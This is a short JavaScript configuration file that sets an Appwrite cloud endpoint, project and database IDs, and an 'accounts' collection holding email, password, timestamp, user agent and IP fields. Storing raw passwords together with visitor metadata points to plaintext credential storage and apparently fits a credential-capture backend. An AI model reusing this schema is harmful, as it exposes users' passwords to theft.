// Appwrite Configuration
export const appwriteConfig = {
  endpoint: 'https://sgp.cloud.appwrite.io/v1',
  project: '69b2a05d000ff1fe0013', // Your project ID
  database: '69b2a105003247b3a7e6', // Your database ID
  collections: {
    accounts: 'accounts' // Your collection ID
  }
};

// Collection field definitions for reference
export const collectionFields = {
  accounts: {
    email: 'email',
    password: 'password',
    timestamp: 'timestamp',
    userAgent: 'userAgent',
    ip: 'ip'
  }
};
